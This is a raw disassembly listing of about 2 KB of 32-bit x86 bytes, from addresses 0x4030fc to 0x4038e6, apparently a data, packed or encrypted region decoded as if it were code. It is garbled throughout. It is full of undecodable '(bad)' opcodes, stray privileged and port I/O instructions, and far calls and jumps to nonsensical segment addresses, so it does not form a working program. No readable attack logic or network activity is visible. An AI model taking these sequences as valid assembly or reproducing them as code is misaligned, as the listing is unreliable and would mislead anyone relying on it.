  4030fc:	inc    esp
  4030fd:	xchg   ebx,eax
  4030fe:	cmp    al,dh
  403100:	adc    DWORD PTR [esi+0x21cb488b],eax
  403106:	add    esp,DWORD PTR [eax+0x7d]
  403109:	fisttp QWORD PTR [esi+ebx*2-0xe]
  40310d:	mov    bh,0xee
  40310f:	mov    al,ds:0x32af26b
  403114:	sar    BYTE PTR [ebp+ebx*4+0xd],cl
  403118:	dec    esp
  403119:	aam    0xc0
  40311b:	inc    eax
  40311c:	into   
  40311d:	pushf  
  40311e:	loope  0x4030a3
  403120:	cmp    al,0xca
  403122:	icebp  
  403123:	pusha  
  403124:	mov    edx,0x34a0c05d
  403129:	add    eax,0x54c971bd
  40312e:	push   ds
  40312f:	cmc    
  403130:	sub    BYTE PTR [eax-0x1efcab42],ch
  403136:	out    dx,eax
  403137:	idiv   DWORD PTR [ebp-0x4d]
  40313a:	add    DWORD PTR [edx-0x10e7e0d6],0x68
  403141:	xchg   bh,dl
  403143:	mov    WORD PTR [esi],cs
  403145:	pop    ecx
  403146:	mov    ds:0xf74ec9c4,eax
  40314b:	loope  0x4031c4
  40314d:	pop    esp
  40314e:	inc    ebx
  40314f:	mov    ecx,0x29f7fd2b
  403154:	cmc    
  403155:	fcomp  QWORD PTR ds:0xe70d0638
  40315b:	ss inc edx
  40315d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40315e:	icebp  
  40315f:	xor    al,0xf9
  403161:	mov    eax,DWORD PTR [ebp-0x5c9889d3]
  403167:	dec    esi
  403168:	fist   WORD PTR [eax-0x1f13ac1a]
  40316e:	call   0xe6ba:0xb184fd1e
  403175:	ss retf 
  403177:	mov    esp,0x6c4f1ad0
  40317c:	inc    esp
  40317d:	jnp    0x40316e
  40317f:	xor    eax,0x12c2536b
  403184:	jecxz  0x40311d
  403186:	imul   edi,DWORD PTR [ecx],0x4d56f51e
  40318c:	and    esp,DWORD PTR [edx]
  40318e:	or     eax,0xa2260a7f
  403193:	fs inc esp
  403195:	data16 fcmovu st,st(4)
  403198:	adc    al,0x68
  40319a:	mov    dl,0x98
  40319c:	rol    BYTE PTR [edi+0x3ea801c1],cl
  4031a2:	push   esi
  4031a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031a4:	nop
  4031a5:	mov    edi,0x185d0eb6
  4031aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031ab:	xor    dl,BYTE PTR [ebp+0x1f0c2311]
  4031b1:	or     edi,DWORD PTR [ebx-0xc00f5d5]
  4031b7:	adc    BYTE PTR [ecx+0x406dfa8],dl
  4031bd:	mov    ah,0xf2
  4031bf:	cld    
  4031c0:	adc    esi,0xff3f55a8
  4031c6:	rcr    DWORD PTR [ecx-0x36],1
  4031c9:	push   0xffffffa5
  4031cb:	dec    esi
  4031cc:	sahf   
  4031cd:	pop    edi
  4031ce:	test   BYTE PTR [ebp+0x65],ah
  4031d1:	push   edi
  4031d2:	mov    eax,ds:0x52afbd09
  4031d7:	mov    ch,0x3f
  4031d9:	jmp    0x25d0e873
  4031de:	mov    edi,0x86a4114a
  4031e3:	stos   BYTE PTR es:[edi],al
  4031e4:	and    ebx,DWORD PTR [eax+0x6c]
  4031e7:	ret    0x90a
  4031ea:	test   cl,0x2b
  4031ed:	cmp    eax,0x47d04ab3
  4031f2:	inc    eax
  4031f3:	add    eax,0x7fba3fd0
  4031f8:	sbb    al,0x28
  4031fa:	lods   al,BYTE PTR ds:[esi]
  4031fb:	mov    eax,0x2081b3c1
  403200:	fiadd  WORD PTR [edi]
  403202:	xor    dl,BYTE PTR [edx]
  403204:	cmp    eax,0x68fe546b
  403209:	je     0x403211
  40320b:	push   ebp
  40320c:	enter  0x53da,0x9
  403210:	adc    BYTE PTR [edx+esi*2],dh
  403213:	jnp    0x4031fd
  403215:	outs   dx,DWORD PTR ds:[esi]
  403216:	inc    ebp
  403217:	dec    ebx
  403218:	jle    0x403236
  40321a:	xor    al,0x74
  40321c:	icebp  
  40321d:	cmp    BYTE PTR [esi-0x31],0xb8
  403221:	ss cli 
  403223:	shr    bh,cl
  403225:	mov    eax,ds:0x7a982663
  40322a:	nop
  40322b:	mov    edi,0x75c6bb4f
  403230:	(bad)  
  403231:	xor    ch,BYTE PTR [ebx-0x25]
  403234:	sahf   
  403235:	int3   
  403236:	push   cs
  403237:	imul   ebx,ebx,0x8d0f7b72
  40323d:	lods   eax,DWORD PTR ds:[esi]
  40323e:	xchg   esp,eax
  40323f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403240:	retf   
  403241:	cmp    eax,0x4b491935
  403246:	mov    dh,0x7b
  403248:	mov    ch,BYTE PTR [edi-0x6fe0ec6f]
  40324e:	mov    dl,0xd0
  403250:	xor    cl,BYTE PTR [ecx]
  403252:	push   ds
  403253:	pop    ecx
  403254:	inc    edi
  403255:	js     0x4031f6
  403257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403258:	inc    esp
  403259:	hlt    
  40325a:	clc    
  40325b:	mov    eax,0x95ced2d3
  403260:	adc    ah,BYTE PTR [ecx+esi*1+0x44928e5b]
  403267:	cli    
  403268:	(bad)  
  403269:	loope  0x403275
  40326b:	std    
  40326c:	sar    DWORD PTR [edi],1
  40326e:	sub    eax,0x6b10375c
  403273:	into   
  403274:	fsubr  st,st(4)
  403276:	js     0x4032bb
  403278:	xchg   DWORD PTR [edx],ecx
  40327a:	add    eax,0xf70aafb8
  40327f:	test   BYTE PTR [edi-0x33267fce],cl
  403285:	push   0xb0e0672d
  40328a:	cld    
  40328b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40328c:	mov    ebx,0x6134e790
  403291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403292:	xchg   ebp,eax
  403293:	scas   eax,DWORD PTR es:[edi]
  403294:	mov    dh,0x6d
  403296:	xor    al,0x23
  403298:	sbb    BYTE PTR [edx],dh
  40329a:	pop    esi
  40329b:	cmp    BYTE PTR [edi+0x5bac90a3],0xd
  4032a2:	jmp    0x40331f
  4032a4:	(bad)  
  4032a5:	jb     0x403246
  4032a7:	sbb    bl,BYTE PTR ds:0xfe4bfad3
  4032ad:	inc    eax
  4032ae:	adc    eax,esp
  4032b0:	rcr    DWORD PTR [edx-0x29],0x1f
  4032b4:	adc    edi,DWORD PTR [edx-0x5955925a]
  4032ba:	or     BYTE PTR ds:0x4ad37540,bl
  4032c0:	ins    BYTE PTR es:[edi],dx
  4032c1:	mov    edi,0xcfc88c5b
  4032c6:	jge    0x403331
  4032c8:	das    
  4032c9:	mov    bh,0xdb
  4032cb:	push   es
  4032cc:	add    al,0x1e
  4032ce:	jmp    0x742f05ee
  4032d3:	loopne 0x4032f6
  4032d5:	inc    eax
  4032d6:	lods   eax,DWORD PTR ds:[esi]
  4032d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032d8:	push   ebp
  4032d9:	and    dl,dl
  4032db:	imul   esp,DWORD PTR [edi],0xffffffd8
  4032de:	jmp    0x403325
  4032e0:	js     0x4032fd
  4032e2:	fld    TBYTE PTR [ecx]
  4032e4:	(bad)  
  4032e5:	test   al,0x51
  4032e7:	push   es
  4032e8:	mov    ds:0x2bc058a7,eax
  4032ed:	jle    0x40329b
  4032ef:	ficomp DWORD PTR [edi]
  4032f1:	dec    ebx
  4032f2:	mov    bh,0xd0
  4032f4:	pop    eax
  4032f5:	ret    
  4032f6:	pop    ss
  4032f7:	pavgw  mm6,mm2
  4032fa:	xchg   ecx,eax
  4032fb:	pop    es
  4032fc:	(bad)  
  4032fd:	push   esi
  4032fe:	out    0xfb,eax
  403300:	(bad)  
  403301:	fchs   
  403303:	arpl   WORD PTR [ebx],dx
  403305:	or     eax,0x1bfcfe52
  40330a:	sub    al,0xaf
  40330c:	pop    esp
  40330d:	sbb    edi,eax
  40330f:	sub    DWORD PTR [ecx],ebp
  403311:	push   ebx
  403312:	add    dl,al
  403314:	dec    edi
  403315:	cs cwde 
  403317:	push   0x1af33908
  40331c:	ret    
  40331d:	test   BYTE PTR [eax+0x27],dh
  403320:	lea    edx,[esi-0x6eb42992]
  403326:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403327:	shr    edi,cl
  403329:	out    dx,al
  40332a:	push   ebp
  40332b:	int3   
  40332c:	mov    bl,bl
  40332e:	(bad)  
  40332f:	jbe    0x40339e
  403331:	or     BYTE PTR [ebx+0x304281cd],ah
  403337:	outs   dx,BYTE PTR ds:[esi]
  403338:	jle    0x40333b
  40333a:	jecxz  0x4032e7
  40333c:	cmp    eax,0xddaa0ff0
  403341:	and    BYTE PTR [ecx],bl
  403343:	repz pop ss
  403345:	inc    eax
  403346:	js     0x40333d
  403348:	add    BYTE PTR [edx+edi*1+0x8],dh
  40334c:	pop    ds
  40334d:	push   ebp
  40334e:	(bad)  
  40334f:	call   0xdf838be5
  403354:	jmp    0x403363
  403356:	pop    ss
  403357:	mov    ah,0x6d
  403359:	in     al,dx
  40335a:	in     eax,0xfb
  40335c:	adc    DWORD PTR [ebx+ebx*1-0x357a54f5],0x7
  403364:	in     al,dx
  403365:	loopne 0x40331c
  403367:	retf   0x7315
  40336a:	adc    esp,DWORD PTR [eax-0x180c878f]
  403370:	pop    ebp
  403371:	jo     0x403388
  403373:	mov    eax,0x83d997d9
  403378:	mov    edx,0x3cd07041
  40337d:	nop
  40337e:	out    dx,al
  40337f:	cmp    bh,bl
  403381:	pop    edx
  403382:	pop    es
  403383:	mov    ebx,0x26b5b765
  403388:	mov    dl,0x32
  40338a:	ds sbb eax,0xc245953d
  403390:	imul   esi,DWORD PTR [edi-0x31],0xffffffa4
  403394:	adc    BYTE PTR [esi+0x432fc039],bh
  40339a:	pop    ebx
  40339b:	pop    esp
  40339c:	arpl   WORD PTR [eax+edx*1+0x3d],dx
  4033a0:	push   edx
  4033a1:	mov    dl,0xe
  4033a3:	cli    
  4033a4:	pushf  
  4033a5:	mov    esp,0xd1a29319
  4033aa:	inc    ecx
  4033ab:	cmp    ebx,DWORD PTR [ebx-0x38d23f8b]
  4033b1:	sahf   
  4033b2:	push   edx
  4033b3:	push   ds
  4033b4:	lods   eax,DWORD PTR ds:[esi]
  4033b5:	mov    al,BYTE PTR [esi+0x42ae9a8b]
  4033bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033bc:	retf   0xeae8
  4033bf:	pusha  
  4033c0:	or     edx,DWORD PTR [edx]
  4033c2:	and    eax,0x7599697e
  4033c7:	push   eax
  4033c8:	dec    esi
  4033c9:	sub    ah,BYTE PTR [edx+0x1f73d0a]
  4033cf:	in     eax,dx
  4033d0:	push   edx
  4033d1:	pop    esp
  4033d2:	xchg   ecx,eax
  4033d3:	add    DWORD PTR [edx-0xaeaca2b],edx
  4033d9:	(bad)  [esi+0x58838822]
  4033df:	mov    cl,0xbe
  4033e1:	rcl    BYTE PTR ds:0x758b,0x4e
  4033e7:	xchg   esi,eax
  4033e8:	and    eax,DWORD PTR [ebp-0x6a]
  4033eb:	js     0x40340f
  4033ed:	pop    esi
  4033ee:	aam    0xb7
  4033f0:	cli    
  4033f1:	push   0xf4c7f5e
  4033f6:	aam    0xb9
  4033f8:	add    ebp,DWORD PTR [ecx+0x2ad0c39e]
  4033fe:	sub    eax,0x7ef9b672
  403403:	push   es
  403404:	jle    0x4033a1
  403406:	jnp    0x4033bb
  403408:	aaa    
  403409:	inc    eax
  40340a:	push   ds
  40340b:	xor    cl,BYTE PTR [ebx+0x835ab33]
  403411:	adc    bl,BYTE PTR [edi+0x3f9bd707]
  403417:	push   ds
  403418:	(bad)  
  403419:	in     eax,dx
  40341a:	jo     0x403419
  40341c:	jae    0x4033c9
  40341e:	(bad)  
  40341f:	or     al,0x8d
  403421:	sar    DWORD PTR [ebx-0x79],0xe9
  403425:	pop    ebx
  403426:	inc    ebp
  403427:	(bad)  
  403428:	cmp    BYTE PTR [edi+0x6],al
  40342b:	xchg   ebx,eax
  40342c:	or     DWORD PTR [eax*8-0x11e02b5b],ebx
  403433:	mov    eax,ds:0xbf9faf5d
  403438:	mov    edi,DWORD PTR [ebx+eiz*2+0x4f85f028]
  40343f:	xchg   esp,eax
  403440:	lock aaa 
  403442:	shl    BYTE PTR [ecx],0x66
  403445:	cld    
  403446:	jl     0x403422
  403448:	dec    ebx
  403449:	xor    eax,0x62a8eefd
  40344e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403450:	push   0xc430cf97
  403455:	add    edi,DWORD PTR [eax]
  403457:	jg     0x403433
  403459:	xor    eax,DWORD PTR [eax+0x7c]
  40345c:	inc    eax
  40345d:	ja     0x4034ba
  40345f:	xchg   ebp,eax
  403460:	dec    edi
  403461:	retf   0x5c9c
  403464:	fcmovu st,st(2)
  403466:	imul   edx,DWORD PTR [esi],0x544d58b3
  40346c:	(bad)  
  40346d:	jp     0x403427
  40346f:	pop    es
  403470:	mov    eax,ds:0x2559540e
  403475:	bound  ebx,QWORD PTR [esi-0x4ac2f5d0]
  40347b:	pop    esp
  40347c:	mov    ebx,DWORD PTR fs:[ebx]
  40347f:	or     eax,0xc13b05d4
  403484:	jge    0x403460
  403486:	leave  
  403487:	fmul   QWORD PTR [eax+0x453db131]
  40348d:	pop    edx
  40348e:	jmp    0x4034fa
  403490:	stos   DWORD PTR es:[edi],eax
  403491:	sub    al,0xf4
  403493:	push   edi
  403494:	into   
  403495:	jnp    0x403492
  403497:	sbb    BYTE PTR [eax],dh
  403499:	stos   DWORD PTR es:[edi],eax
  40349a:	jecxz  0x4034ce
  40349c:	add    BYTE PTR [ecx-0xd],cl
  40349f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034a0:	fwait
  4034a1:	sbb    esp,ebp
  4034a3:	in     eax,0x2c
  4034a5:	arpl   WORD PTR [edi-0x40],bx
  4034a8:	xchg   esi,eax
  4034a9:	add    al,0xe4
  4034ab:	cli    
  4034ac:	mov    cl,0x5b
  4034ae:	jae    0x403506
  4034b0:	fisttp QWORD PTR [edx]
  4034b2:	sahf   
  4034b3:	sub    BYTE PTR [esi+0x9],0x3
  4034b7:	int    0x68
  4034b9:	imul   eax,DWORD PTR [eax-0x7528954],0x50cc5bcf
  4034c3:	mov    ah,BYTE PTR [edi+0x77]
  4034c6:	dec    eax
  4034c7:	les    edi,FWORD PTR [edi+0x738dc34f]
  4034cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034ce:	add    eax,0x86c1f718
  4034d3:	mov    WORD PTR [ebp-0x63],gs
  4034d6:	in     eax,dx
  4034d7:	push   ds
  4034d8:	arpl   WORD PTR [edi],di
  4034da:	push   ds
  4034db:	call   0xaf6b:0x866c8816
  4034e2:	mov    edx,0x1e656086
  4034e7:	je     0x4034b0
  4034e9:	or     al,0x2e
  4034eb:	adc    eax,0xfad63304
  4034f0:	jbe    0x4034aa
  4034f2:	shl    BYTE PTR [edi+esi*1-0xfc0e423],cl
  4034f9:	jo     0x4034e1
  4034fb:	lds    edi,FWORD PTR [edx+0x2a]
  4034fe:	ror    BYTE PTR [ecx],1
  403500:	lods   eax,DWORD PTR ds:[esi]
  403501:	ss fdivr st(2),st
  403504:	pop    eax
  403505:	adc    BYTE PTR [eax],ch
  403507:	pop    edi
  403508:	daa    
  403509:	jge    0x4034b0
  40350b:	jge    0x4034e3
  40350d:	mov    al,ds:0x745546c2
  403512:	mov    eax,0x2552931e
  403517:	mov    ebx,DWORD PTR [esp+ebx*4+0x69]
  40351b:	add    bl,dl
  40351d:	mov    al,0xeb
  40351f:	inc    esi
  403520:	dec    esp
  403521:	jnp    0x4034f3
  403523:	cmp    DWORD PTR gs:[eax],ecx
  403526:	mov    esp,0x24cab6a5
  40352b:	xchg   edi,eax
  40352c:	mov    al,ds:0x9005e8fe
  403531:	and    bl,BYTE PTR [edi]
  403533:	pop    ebp
  403534:	mov    DWORD PTR [eax+0x398968a0],esi
  40353a:	dec    eax
  40353b:	pop    esp
  40353c:	push   edx
  40353d:	add    esp,DWORD PTR [edi-0x79a98284]
  403543:	repz test BYTE PTR [eax],ch
  403546:	repz (bad) 
  403548:	outs   dx,BYTE PTR ds:[esi]
  403549:	pusha  
  40354a:	and    DWORD PTR [ebx-0x22],edx
  40354d:	dec    esp
  40354e:	sub    DWORD PTR [edx+0xb],ebp
  403551:	jb     0x40356d
  403553:	cmp    WORD PTR [eax+0x7e7ea0fc],0xffba
  40355b:	dec    esp
  40355c:	mov    esi,0xe51a94f7
  403561:	sbb    BYTE PTR [ecx-0x76740aa9],0xbf
  403568:	sub    al,0x1d
  40356a:	push   ecx
  40356b:	popf   
  40356c:	mov    al,0x6e
  40356e:	xor    ebp,esi
  403570:	stc    
  403571:	rol    DWORD PTR [esp+ebx*8+0x26],1
  403575:	imul   bh
  403577:	repz imul ebx,DWORD PTR [ebp-0x26],0xffffffad
  40357c:	addr16 dec eax
  40357e:	sbb    al,0x3d
  403580:	jg     0x4035d8
  403582:	dec    edi
  403583:	hlt    
  403584:	cmc    
  403585:	sahf   
  403586:	mov    al,ds:0xe5024652
  40358b:	jg     0x4035d7
  40358d:	into   
  40358e:	xor    eax,0x1c359417
  403593:	pop    esp
  403594:	push   esp
  403595:	mov    ds:0x85d990bf,eax
  40359a:	jnp    0x4035fc
  40359c:	std    
  40359d:	les    esp,FWORD PTR [eax-0x19]
  4035a0:	dec    esp
  4035a1:	leave  
  4035a2:	xchg   DWORD PTR [edx],esp
  4035a4:	inc    esi
  4035a5:	sbb    BYTE PTR [ebx+0x65f21dcf],al
  4035ab:	enter  0x60c,0x23
  4035af:	not    BYTE PTR ss:[edx]
  4035b2:	(bad)  
  4035b3:	popa   
  4035b4:	leave  
  4035b5:	sbb    DWORD PTR [ecx],ebp
  4035b7:	idiv   dl
  4035b9:	cmp    WORD PTR [esi],ax
  4035bc:	bound  esi,QWORD PTR [ebp-0x6189e639]
  4035c2:	mov    esi,0x30302c89
  4035c7:	mov    dh,0xd6
  4035c9:	sub    al,0xfd
  4035cb:	inc    eax
  4035cc:	repnz inc edi
  4035ce:	js     0x403623
  4035d0:	mov    dl,0x37
  4035d2:	mov    al,0x4e
  4035d4:	dec    ecx
  4035d5:	test   BYTE PTR [esp+edx*8+0x4b97400f],dh
  4035dc:	jb     0x4035e0
  4035de:	add    DWORD PTR [ebp+0x12f47331],0xa3985a4f
  4035e8:	jbe    0x403637
  4035ea:	inc    esi
  4035eb:	dec    esi
  4035ec:	repz test BYTE PTR [ebx],dh
  4035ef:	cmp    DWORD PTR [ebx+ecx*2+0x47],ebp
  4035f3:	cmp    BYTE PTR [ebp-0xb],ah
  4035f6:	xchg   edi,eax
  4035f7:	test   DWORD PTR [edx],ebx
  4035f9:	pop    ecx
  4035fa:	xchg   ebx,eax
  4035fb:	bound  esi,QWORD PTR ds:0xa9234e93
  403601:	mov    ds:0x95a6ac36,al
  403606:	scas   al,BYTE PTR es:[edi]
  403607:	sub    bl,ch
  403609:	and    DWORD PTR [esi-0x24],0xffffff93
  40360d:	jmp    0x40365f
  40360f:	loop   0x4035ed
  403611:	inc    ecx
  403612:	xchg   edi,eax
  403613:	adc    eax,0x8ab5c964
  403618:	retf   0xd510
  40361b:	and    BYTE PTR [ecx+0x800f61b],ah
  403621:	jp     0x4035b2
  403623:	je     0x403690
  403625:	xchg   edi,eax
  403626:	jecxz  0x40363b
  403628:	push   esp
  403629:	cwde   
  40362a:	dec    esi
  40362b:	pop    es
  40362c:	sbb    eax,0x5b8e898a
  403631:	inc    eax
  403632:	outs   dx,DWORD PTR ds:[esi]
  403633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403634:	int3   
  403635:	scas   al,BYTE PTR es:[edi]
  403636:	cmp    cl,BYTE PTR [ecx-0x30]
  403639:	sahf   
  40363a:	mov    dh,bh
  40363c:	xor    DWORD PTR [edx-0x8a7456f],ebp
  403642:	xchg   edx,eax
  403643:	jmp    0x40362d
  403645:	jne    0x403663
  403647:	data16 je 0x40368a
  40364a:	inc    eax
  40364b:	test   DWORD PTR [edx+0x68],edi
  40364e:	enter  0xa00a,0x33
  403652:	push   eax
  403653:	test   eax,0x3a593224
  403658:	ror    DWORD PTR [esi+ebx*8+0x7f8911b5],1
  40365f:	les    esp,FWORD PTR [esi-0x1d]
  403662:	pushf  
  403663:	push   ss
  403664:	mov    edx,0x414de6b9
  403669:	adc    DWORD PTR [ebx-0x2132f6f9],edx
  40366f:	inc    esi
  403670:	fimul  DWORD PTR [ecx-0x3d43a808]
  403676:	and    al,0x46
  403678:	fisttp WORD PTR [edi]
  40367a:	sbb    dh,BYTE PTR [ebp-0x6a973d7c]
  403680:	popf   
  403681:	arpl   si,cx
  403683:	lods   al,BYTE PTR ds:[esi]
  403684:	rcr    DWORD PTR [ecx],1
  403686:	out    0xd8,al
  403688:	jnp    0x40369d
  40368a:	sbb    BYTE PTR [edx-0x59e75045],bh
  403690:	std    
  403691:	(bad)  
  403692:	repnz stos DWORD PTR es:[edi],eax
  403694:	xlat   BYTE PTR ds:[ebx]
  403695:	push   edi
  403696:	dec    edx
  403697:	mov    ecx,ds
  403699:	fidiv  WORD PTR [esi-0x36]
  40369c:	xchg   edx,eax
  40369d:	jl     0x403681
  40369f:	pop    edx
  4036a0:	jle    0x403709
  4036a2:	sbb    cl,bl
  4036a4:	and    al,0x91
  4036a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036a7:	cld    
  4036a8:	jo     0x4036f6
  4036aa:	call   0xd2e1:0x578910cb
  4036b1:	pop    edx
  4036b2:	stos   DWORD PTR es:[edi],eax
  4036b3:	fld    DWORD PTR [eax+0x7f]
  4036b6:	push   ebx
  4036b7:	scas   al,BYTE PTR es:[edi]
  4036b8:	sbb    cl,0x80
  4036bb:	into   
  4036bc:	fprem  
  4036be:	inc    edx
  4036bf:	fcom   DWORD PTR [edx]
  4036c1:	jns    0x4036d2
  4036c3:	aam    0xb6
  4036c5:	dec    ebp
  4036c6:	daa    
  4036c7:	mov    edx,0xe3599e8
  4036cc:	lahf   
  4036cd:	popf   
  4036ce:	adc    bl,dl
  4036d0:	mov    edi,0xd0adc807
  4036d5:	sti    
  4036d6:	test   BYTE PTR [esi],al
  4036d8:	sbb    ah,al
  4036da:	(bad)  
  4036db:	fisub  DWORD PTR ds:0x1c6023ea
  4036e1:	clc    
  4036e2:	ret    0x2f13
  4036e5:	sub    esp,ecx
  4036e7:	daa    
  4036e8:	clc    
  4036e9:	and    DWORD PTR [ebp+0x27505c3e],ecx
  4036ef:	in     eax,0x7f
  4036f1:	shl    BYTE PTR [esi-0x26],1
  4036f4:	cmp    DWORD PTR [esp+esi*8],ebp
  4036f7:	push   0x42
  4036f9:	int3   
  4036fa:	or     DWORD PTR [edx],0x66c19be
  403700:	sbb    al,0x16
  403702:	jmp    0x40370b
  403704:	pop    es
  403705:	push   ss
  403706:	xlat   BYTE PTR ds:[ebx]
  403707:	mov    cl,0x81
  403709:	cmp    eax,0x3a54b831
  40370e:	push   cs
  40370f:	fstp   DWORD PTR [edi+ebp*2+0x36b6413e]
  403716:	lds    ebx,FWORD PTR [edi+0x5d]
  403719:	aas    
  40371a:	add    DWORD PTR [edx+0x36],esi
  40371d:	jmp    0x7bbc:0x2e51e394
  403724:	jbe    0x4036be
  403726:	sub    DWORD PTR [edx+0x1fc230d8],ebp
  40372c:	inc    ecx
  40372d:	mov    eax,ds:0x2bde5197
  403732:	and    DWORD PTR ds:0x3d888d4d,edi
  403738:	in     al,dx
  403739:	in     al,dx
  40373a:	cs mov eax,0xdee96e04
  403740:	mov    ecx,0x80bac0ea
  403745:	retf   
  403746:	xchg   edx,eax
  403747:	sbb    ebp,DWORD PTR [ebx-0x4b68611e]
  40374d:	pop    edx
  40374e:	push   ss
  40374f:	leave  
  403750:	cmp    dl,BYTE PTR [ebp-0x5]
  403753:	(bad)  
  403754:	xor    cl,bl
  403756:	aaa    
  403757:	mov    ebp,0x39134290
  40375c:	es std 
  40375e:	iret   
  40375f:	xchg   si,ax
  403761:	enter  0xd3b5,0xcd
  403765:	fcomi  st,st(3)
  403767:	xchg   ebx,eax
  403768:	mov    al,ds:0xef43c77a
  40376d:	sbb    eax,0x4fca9c72
  403772:	in     eax,0xde
  403774:	fbld   TBYTE PTR [edi-0x5b9a0807]
  40377a:	and    DWORD PTR [eax+0x69252b3],ebp
  403780:	push   ds
  403781:	pushf  
  403782:	push   ebp
  403783:	push   es
  403784:	push   eax
  403785:	adc    BYTE PTR gs:[esi-0x6],ch
  403789:	sbb    BYTE PTR [ebx],ch
  40378b:	pop    edx
  40378c:	or     DWORD PTR [ebx],esp
  40378e:	pop    edx
  40378f:	shl    bh,cl
  403791:	and    bh,0x4b
  403794:	lahf   
  403795:	hlt    
  403796:	cmp    DWORD PTR [edx+0x7394fa45],0xfffffffc
  40379d:	push   es
  40379e:	mov    ds:0x283c4b9,al
  4037a3:	jmp    0xd3d:0x5737eeeb
  4037aa:	xchg   edi,eax
  4037ab:	sbb    edx,DWORD PTR [esi+eiz*2]
  4037ae:	push   eax
  4037af:	out    0x18,al
  4037b1:	xor    BYTE PTR [eax-0x54],dh
  4037b4:	push   ebx
  4037b5:	pop    esp
  4037b6:	jg     0x40380a
  4037b8:	mov    ch,0x31
  4037ba:	cdq    
  4037bb:	and    eax,0xa1f3a41
  4037c0:	sub    al,0xa8
  4037c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037c3:	rcr    BYTE PTR [edi],cl
  4037c5:	lahf   
  4037c6:	ret    
  4037c7:	or     bh,BYTE PTR [ebx]
  4037c9:	dec    eax
  4037ca:	es add ah,bl
  4037cd:	pop    edx
  4037ce:	out    0x2,eax
  4037d0:	jp     0x40384b
  4037d2:	push   ebp
  4037d3:	inc    ebp
  4037d4:	sbb    dl,ch
  4037d6:	enter  0xc04e,0x39
  4037da:	repnz add cl,BYTE PTR [edx]
  4037dd:	inc    edx
  4037de:	push   cs
  4037df:	mov    eax,0x4a72edd0
  4037e4:	ja     0x4037eb
  4037e6:	cld    
  4037e7:	dec    BYTE PTR ds:0xa4655983
  4037ed:	jne    0x403824
  4037ef:	sbb    BYTE PTR [edi-0x4f],bh
  4037f2:	repnz xor al,0xb4
  4037f6:	ret    0x64d7
  4037f9:	pop    esp
  4037fa:	dec    esi
  4037fb:	mov    dh,0x18
  4037fd:	ins    DWORD PTR es:[edi],dx
  4037fe:	jns    0x403794
  403800:	adc    ebp,ebx
  403802:	jp     0x403824
  403804:	add    esi,esp
  403806:	rcr    DWORD PTR [ebx-0x18009278],1
  40380c:	cmp    DWORD PTR [edx+0x14ea0fbb],edx
  403812:	adc    eax,0x19c8da1a
  403817:	std    
  403818:	test   edx,eax
  40381a:	fwait
  40381b:	dec    edi
  40381c:	push   esi
  40381d:	out    dx,al
  40381e:	cmp    al,0x13
  403820:	stc    
  403821:	inc    ebx
  403822:	jmp    0x3825:0x45f7dc8
  403829:	int3   
  40382a:	pop    eax
  40382b:	mov    bh,BYTE PTR [ebp+0x45]
  40382e:	lahf   
  40382f:	call   0x61fe:0x13e8ece8
  403836:	inc    ecx
  403837:	cld    
  403838:	cmp    eax,0xd2bad1dc
  40383d:	cmp    BYTE PTR [eax],al
  40383f:	sub    eax,0x4276410d
  403844:	cld    
  403845:	call   0x1596:0x966ecff6
  40384c:	(bad)
  403850:	push   ebx
  403851:	mov    al,0xb0
  403853:	xchg   ebp,eax
  403854:	ins    DWORD PTR es:[edi],dx
  403855:	xchg   DWORD PTR [ecx],ebx
  403857:	sbb    BYTE PTR [ecx],ah
  403859:	xchg   ebx,eax
  40385a:	jmp    0xd12dc111
  40385f:	bound  eax,QWORD PTR [ebp-0x43]
  403862:	xchg   BYTE PTR [edi+edx*2],bh
  403865:	xchg   edx,eax
  403866:	dec    eax
  403867:	xchg   BYTE PTR ds:0x5250f3c2,dh
  40386d:	dec    edi
  40386e:	xchg   esp,eax
  40386f:	aad    0xc9
  403871:	inc    esp
  403872:	pop    edi
  403873:	sahf   
  403874:	jle    0x4038f5
  403876:	aad    0xe2
  403878:	jnp    0x40389c
  40387a:	(bad)  
  40387c:	cdq    
  40387d:	fadd   DWORD PTR [edi-0x485b2f25]
  403883:	ja     0x403839
  403885:	mov    ah,0x62
  403887:	out    0x96,al
  403889:	push   ebx
  40388a:	sub    esi,esi
  40388c:	cwde   
  40388d:	dec    edx
  40388e:	aad    0x6
  403890:	adc    BYTE PTR [esi],cl
  403892:	in     al,0x33
  403894:	mov    bl,0xaf
  403896:	cmp    BYTE PTR [ebp-0x33],cl
  403899:	mov    al,0xcb
  40389b:	fstp   st(7)
  40389d:	fwait
  40389e:	and    DWORD PTR [ecx-0x36],ebp
  4038a1:	mov    dl,0x26
  4038a3:	test   DWORD PTR [ebx],ebx
  4038a5:	mov    al,ds:0xa602c50b
  4038aa:	push   ss
  4038ab:	lods   al,BYTE PTR gs:[esi]
  4038ad:	enter  0xe9de,0xee
  4038b1:	push   0x7
  4038b3:	lea    ebp,[esi]
  4038b5:	in     eax,dx
  4038b6:	xchg   esp,eax
  4038b7:	sub    ecx,DWORD PTR [eax-0x44e4e1bc]
  4038bd:	(bad)  
  4038be:	retf   
  4038bf:	xorps  xmm3,XMMWORD PTR [esi-0x5976a0a3]
  4038c6:	sbb    ebx,esi
  4038c8:	mov    edi,0x11a65a14
  4038cd:	pop    esp
  4038ce:	nop
  4038cf:	stos   DWORD PTR es:[edi],eax
  4038d0:	xor    DWORD PTR [edi+0x45bd7a97],eax
  4038d6:	das    
  4038d7:	jne    0x40387d
  4038d9:	push   0xcc066577
  4038de:	mov    DWORD PTR [edx-0x3291ba71],ebp
  4038e4:	jmp    0x403928
  4038e6:	dec    eax
